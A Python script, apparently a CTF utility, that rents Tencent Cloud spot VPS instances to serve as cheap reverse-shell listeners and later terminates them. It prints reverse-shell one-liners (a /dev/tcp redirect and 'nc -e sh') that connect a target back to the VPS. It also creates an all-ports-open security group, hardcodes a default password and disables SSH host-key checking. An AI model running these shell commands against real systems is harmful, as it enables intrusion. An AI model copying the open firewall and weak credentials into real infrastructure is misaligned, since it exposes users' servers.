import json
import subprocess
from time import sleep
from lib.clasetting import CustomInputHandler
from tencentcloud.common import credential
from tencentcloud.common.profile.client_profile import ClientProfile
from tencentcloud.common.profile.http_profile import HttpProfile
from tencentcloud.common.exception.tencent_cloud_sdk_exception import TencentCloudSDKException
from tencentcloud.cvm.v20170312 import cvm_client, models as cvm_models
from tencentcloud.vpc.v20170312 import vpc_client, models as vpc_models
# pip install tencentcloud-sdk-python-cvm
# pip install tencentcloud-sdk-python-vpc

credentials = {
    "SecretId": "",
    "SecretKey": "",
    "Password":"root@Tencent_vps_Shell",
    "Description": "Password 是实例主机启动密码，需要包含大小写字母、数字和特殊字符，长度8-30位。默认为 root@Tencent_vps_Shell , 建议修改，推荐配置公私钥实现免密登录"
}

templates = {   
    "module_1":{
        "region":"ap-nanjing",
        "description":"南京模块,配置信息为2核心2G内存,20G系统盘,10M带宽,镜像为Ubuntu Server 22.04 LTS 64位(ID:img-487zeit5)",
        "Price":"实例 ¥0.05 系统盘存储空间 ¥0.02 公网带宽按流量计费¥0.80/GB(内地) 每小时结算 平均资费-¥0.08/小时",
        "params":{
            "InstanceChargeType": "SPOTPAID",
            "Placement": {
                "Zone": "ap-nanjing-2"
            },
            "ImageId": "img-487zeit5",
            "SystemDisk": {
                "DiskSize": 20
            },
            "InternetAccessible": {
                "InternetChargeType": "TRAFFIC_POSTPAID_BY_HOUR",
                "InternetMaxBandwidthOut": 10,
                "PublicIpAssigned": True
            },
            "InstanceCount": 1,
            "InstanceName": "HelloShell",
            "LoginSettings": {
                "Password": "root@Tencent_vps_Shell"
            },
            "SecurityGroupIds": [ "sg-94qbn8va" ],
            "EnhancedService": {
                "SecurityService": {
                    "Enabled": True
                },
                "MonitorService": {
                    "Enabled": True
                }
            }
        }
    },
    "module_2":{
        "region":"ap-hongkong",
        "description":"香港模块,配置信息为2核心2G内存,20G系统盘,10M带宽,镜像为Ubuntu Server 22.04 LTS 64位(ID:img-487zeit5)",
        "Price":"实例¥0.01 系统盘存储空间¥0.03 公网带宽按流量计费¥0.67/GB(香港) 每小时结算 平均资费-¥0.04/小时",
        "params":{
            "InstanceChargeType": "SPOTPAID",
            "Placement": {
                "Zone": "ap-hongkong-2"
            },
            "ImageId": "img-487zeit5",
            "SystemDisk": {
                "DiskSize": 20
            },
            "InternetAccessible": {
                "InternetChargeType": "TRAFFIC_POSTPAID_BY_HOUR",
                "InternetMaxBandwidthOut": 10,
                "PublicIpAssigned": True
            },
            "InstanceCount": 1,
            "InstanceName": "HelloShell",
            "LoginSettings": {
                "Password": "root@Tencent_vps_Shell"
            },
            "SecurityGroupIds": [ "sg-8ctcv6d1" ],
            "EnhancedService": {
                "SecurityService": {
                    "Enabled": True
                },
                "MonitorService": {
                    "Enabled": True
                }
            }
        }
    },
    "module_3":{
        "region":"ap-hongkong",
        "description":"香港模块(公钥登录模块),配置信息为2核心2G内存,20G系统盘,10M带宽,镜像为Ubuntu Server 22.04 LTS 64位(ID:img-487zeit5)",
        "Price":"实例¥0.01 系统盘存储空间¥0.03 公网带宽按流量计费¥0.67/GB(香港) 每小时结算 平均资费-¥0.04/小时",
        "params":{
            "InstanceChargeType": "SPOTPAID",
            "Placement": {
                "Zone": "ap-hongkong-2"
            },
            "ImageId": "img-487zeit5",
            "SystemDisk": {
                "DiskSize": 20
            },
            "InternetAccessible": {
                "InternetChargeType": "TRAFFIC_POSTPAID_BY_HOUR",
                "InternetMaxBandwidthOut": 10,
                "PublicIpAssigned": True
            },
            "InstanceCount": 1,
            "InstanceName": "HelloShell",
            "LoginSettings": {
                "KeyIds": [ "skey-i5d3b9vd" ]
            },
            "SecurityGroupIds": [ "sg-8ctcv6d1" ],
            "EnhancedService": {
                "SecurityService": {
                    "Enabled": True
                },
                "MonitorService": {
                    "Enabled": True
                }
            }
        }
    }
}

def get_cred(credfile):
    # with open(credfile, 'r', encoding='utf-8-sig') as file:
    #     credentials = json.load(file)
    secret_id = credentials.get('SecretId')
    secret_key = credentials.get('SecretKey')
    password = credentials.get('Password')
    cred = credential.Credential(secret_id, secret_key)
    return cred, password

def get_clientProfile(type):
    httpProfile = HttpProfile()
    httpProfile.endpoint = type + ".tencentcloudapi.com"
    clientProfile = ClientProfile(httpProfile=httpProfile)
    return clientProfile

# 模块加载器
def module_loader(module):
    module_config_file = 'hello_shell.json'
    try:
        # with open(module_config_file, 'r',encoding='utf-8-sig') as file:
        #     templates = json.load(file)
        if module in templates:
            module_info = templates[module]
            description = module_info.get('description', 'N/A')
            price = module_info.get('Price', 'N/A')
            region = module_info.get('region', 'N/A')
            params = module_info.get('params', {})
            print(f"已载入: {description}\n资费信息: {price}")
            return region, params
        else:
            print(f"无效配置 未找到对应模块'{module}' ")
    except FileNotFoundError:
        print(f"配置文件 '{module_config_file}' 的坐标呢？")
    except json.JSONDecodeError:
        print(f"'{module_config_file}'是什么破玩意,理解不了!说了让你用json 用json!!! ")

# 安全组查询
def check_security_group(cred, clientProfile,region):
    try:
        client = vpc_client.VpcClient(cred, region, clientProfile)

        req = vpc_models.DescribeSecurityGroupsRequest()
        params = {} 
        req.from_json_string(json.dumps(params))
        resp = client.DescribeSecurityGroups(req)
        resp_json = json.loads(resp.to_json_string())

        security_groups = resp_json.get("SecurityGroupSet", [])
        total_count = len(security_groups)
        print(f"在该地区查询到 {total_count} 个安全组, id为", end=' ')
        for group in security_groups:
            print(group["SecurityGroupId"], end=' ')

        for group in security_groups:
            if "放通全部端口" in group["SecurityGroupName"]:
                return group["SecurityGroupId"] 
        print("\n没有检测到全通安全组，正在创建...")
        return create_security_group(cred, clientProfile, region)


    except TencentCloudSDKException as err:
        print(f"Error occurred: {err}")
        return None
    
# 安全组创建
def create_security_group(cred, clientProfile, region):
    try:
        client = vpc_client.VpcClient(cred, region, clientProfile)

        req = vpc_models.CreateSecurityGroupWithPoliciesRequest()
        params = {
        "GroupName": "HelloShell-放通全部端口",
        "GroupDescription": "放通全部端口-buildByHelloShell",
        "SecurityGroupPolicySet": {
            "Egress": [
                {
                    "PolicyIndex": 0,
                    "Protocol": "ALL",
                    "Port": "ALL",
                    "Action": "ACCEPT"
                }
            ],
            "Ingress": [
                {
                    "Protocol": "ALL",
                    "Port": "ALL",
                    "Action": "ACCEPT"
                }
            ]
        }
    }
        req.from_json_string(json.dumps(params))
        resp = client.CreateSecurityGroupWithPolicies(req)
        resp_json = json.loads(resp.to_json_string())
        print(f"创建安全组 {resp_json['SecurityGroup']['SecurityGroupId']} 成功")
        return resp_json["SecurityGroup"]["SecurityGroupId"]

    except TencentCloudSDKException as err:
        print(f"Error occurred: {err}")
        return None

# 查询实例
def describe_instances(cred, clientProfile, region, InstanceIds):
    try:
        client = cvm_client.CvmClient(cred, region, clientProfile)
        req = cvm_models.DescribeInstancesRequest()
        params = {
            "InstanceIds": [InstanceIds]
        }
        req.from_json_string(json.dumps(params))
        resp = client.DescribeInstances(req)
        resp_json = json.loads(resp.to_json_string())

        if resp_json.get("TotalCount", 0) > 0:
            instance_info = resp_json["InstanceSet"][0]
            # print(instance_info)
            if "PublicIpAddresses" in instance_info and instance_info["PublicIpAddresses"]:
                public_ip = instance_info["PublicIpAddresses"][0]
                instance_type = instance_info.get("InstanceType", "Unknown")
                instance_data = {
                    "username_at_ip": f"ubuntu@{public_ip}",
                    "region": region
                }

                print(f"ubuntu@{public_ip} 创建完成 机型 {instance_type}")
                global ip 
                ip = public_ip

                try:
                    with open("running.json", "r") as file:
                        existing_data = json.load(file)
                except FileNotFoundError:
                    existing_data = {}

                existing_data[InstanceIds] = instance_data

                with open("running.json", "w") as file:
                    json.dump(existing_data, file)

                return public_ip
            else:
                print(f"等待实例 {InstanceIds} 初始化...")
                sleep(5)
                return describe_instances(cred, clientProfile, region, InstanceIds)
        else:
            print("未找到指定的实例")
            return None

    except TencentCloudSDKException as err:
        print(err)
        return None


# 创建实例
def create_instance(cred, clientProfile, region, params, openID, passwd):
    try:
        client = cvm_client.CvmClient(cred, region, clientProfile)
        req = cvm_models.RunInstancesRequest()

        params["SecurityGroupIds"] = [openID]
        # 如果 params["LoginSettings"]["Password"] 不存在，即为公钥登录
        if "LoginSettings" in params and "Password" in params["LoginSettings"]:
            params["LoginSettings"]["Password"] = passwd

        req.from_json_string(json.dumps(params))
        resp = client.RunInstances(req)
        resp_json = json.loads(resp.to_json_string())

        instance_id_set = resp_json.get("InstanceIdSet", [])
        if instance_id_set:
            instance_id = instance_id_set[0]  
            print(f"成功创建实例 ID {instance_id}")
            return instance_id
        else:
            print("未能成功创建实例 报错信息如下")
            return None

    except TencentCloudSDKException as err:
        print(err)
        return None

# 退还实例
def terminate_instance(cred, clientProfile, InstanceIds=None):
    try:
        # 从文件读取运行中的实例信息
        with open("running.json", "r") as file:
            running_instances = json.load(file)

        if InstanceIds:
            # 退还指定的实例
            if InstanceIds in running_instances:
                instance_info = running_instances[InstanceIds]
                region = instance_info["region"]  
                client = cvm_client.CvmClient(cred, region, clientProfile)  

                print(f"运行中 ID：{instance_info['username_at_ip']}")

                req = cvm_models.TerminateInstancesRequest()
                params = {"InstanceIds": [InstanceIds]}
                req.from_json_string(json.dumps(params))
                resp = client.TerminateInstances(req)

                print(f"实例 {InstanceIds} 已退还")
                del running_instances[InstanceIds]  
            else:
                print(f"实例 {InstanceIds} 不存在或已被退还")

        else:
            # 退还所有实例
            for InstanceId, instance_info in running_instances.items():
                region = instance_info["region"]  
                client = cvm_client.CvmClient(cred, region, clientProfile)  

                print(f"运行中 ID：{instance_info['username_at_ip']}")

                req = cvm_models.TerminateInstancesRequest()
                params = {"InstanceIds": [InstanceId]}
                req.from_json_string(json.dumps(params))
                resp = client.TerminateInstances(req)

                print(f"实例 {InstanceId} 已退还")
            running_instances.clear()  


        with open("running.json", "w") as file:
            json.dump(running_instances, file)

    except FileNotFoundError:
        print("没有找到 'running.json' 文件")
    except json.JSONDecodeError:
        print("'running.json' 文件格式错误")
    except TencentCloudSDKException as err:
        print(err)

def start_ssh_session(username, ip):
    if ip is None:
        print("实例创建出现问题，请检查日志")
        return
    ssh_command = ["ssh", "-o", "StrictHostKeyChecking=no", f"{username}@{ip}"]
    subprocess.run(ssh_command)

def print_project_info():
    print("********** CTF，启动！！！ **********")
    print("——反弹shell最廉价解决方案 By 探姬_Official")

ip = None
def check(**kwargs):
    print_project_info()

    print("\n了解你的捍卫者：")
    print(">1 VPS，启动！(默认使用模块2)")
    print(">2 到底要选哪个呢？(自定义启动模块)")
    print(">3 全都烧光！(退还所有实例)")

    choice = CustomInputHandler.input(">>> ")

    cred, passwd = get_cred("cred")
    cvm_clientProfile = get_clientProfile("cvm")
    vpc_clientProfile = get_clientProfile("vpc")

    if choice == '1':
        # 默认使用模块2创建一台服务器
        region, params = module_loader("module_2")
        openID = check_security_group(cred, vpc_clientProfile, region)
        instance_id = create_instance(cred, cvm_clientProfile, region, params, openID, passwd)
        describe_instances(cred, cvm_clientProfile, region, instance_id)
        # print("初始化ssh连接...")
        print(f"提示:您可以使用 'nc -lvnp 9001' 建立监听，在使用目标机上使用 'sh -i >& /dev/tcp/{ip}/9001 0>&1' 或者 'nc {ip} 9001 -e sh' 建立反弹shell  ")
        print(f"ssh -o StrictHostKeyChecking=no ubuntu@{ip} SSH密码 {passwd} ")
        # start_ssh_session('ubuntu', ip)
        # start_ssh_session('ubuntu', ip)

    elif choice == '2':
        # 自定义启动模块
        # with open('hello_shell.json', 'r', encoding='utf-8-sig') as file:
        #     templates = json.load(file)
        print("\n可用模块：")
        for key, value in templates.items():
            print(f"{key}: {value['description']}, 资费信息: {value['Price']}")

        module_choice = CustomInputHandler.input("\n请选择要使用的模块 (例如: module_3): ")
        if module_choice in templates:
            region, params = module_loader(module_choice)
            openID = check_security_group(cred, vpc_clientProfile, region)
            instance_id = create_instance(cred, cvm_clientProfile, region, params, openID, passwd)
            describe_instances(cred, cvm_clientProfile, region, instance_id)
        else:
            print("无效的模块选择")

    elif choice == '3':
        # 退还所有实例
        terminate_instance(cred, cvm_clientProfile)

    else:
        print("?你在选什么!")

if __name__ == "__main__":
    print_project_info()
    ip = None

    print("\n了解你的捍卫者：")
    print(">1 VPS，启动！(默认使用模块2)")
    print(">2 到底要选哪个呢？(自定义启动模块)")
    print(">3 全都烧光！(退还所有实例)")

    choice = CustomInputHandler.input(">>> ")

    cred, passwd = get_cred("cred")
    cvm_clientProfile = get_clientProfile("cvm")
    vpc_clientProfile = get_clientProfile("vpc")

    if choice == '1':
        # 默认使用模块2创建一台服务器
        region, params = module_loader("module_2")
        openID = check_security_group(cred, vpc_clientProfile, region)
        instance_id = create_instance(cred, cvm_clientProfile, region, params, openID, passwd)
        describe_instances(cred, cvm_clientProfile, region, instance_id)
        print("初始化ssh连接...")
        print(f"提示:您可以使用 'nc -lvnp 9001' 建立监听，在使用目标机上使用 'sh -i >& /dev/tcp/{ip}/9001 0>&1' 或者 'nc {ip} 9001 -e sh' 建立反弹shell  ")
        print(f"ssh ubuntu@{ip} 如果非公钥登录请使用设置的密码 {passwd} ")
        start_ssh_session('ubuntu', ip)
        start_ssh_session('ubuntu', ip)

    elif choice == '2':
        # 自定义启动模块
        # with open('hello_shell.json', 'r', encoding='utf-8-sig') as file:
        #     templates = json.load(file)

        print("\n可用模块：")
        for key, value in templates.items():
            print(f"{key}: {value['description']}, 资费信息: {value['Price']}")

        module_choice = CustomInputHandler.input("\n请选择要使用的模块 (例如: module_3): ")
        if module_choice in templates:
            region, params = module_loader(module_choice)
            openID = check_security_group(cred, vpc_clientProfile, region)
            instance_id = create_instance(cred, cvm_clientProfile, region, params, openID, passwd)
            describe_instances(cred, cvm_clientProfile, region, instance_id)
        else:
            print("无效的模块选择")

    elif choice == '3':
        # 退还所有实例
        terminate_instance(cred, cvm_clientProfile)

    else:
        print("?你在选什么!")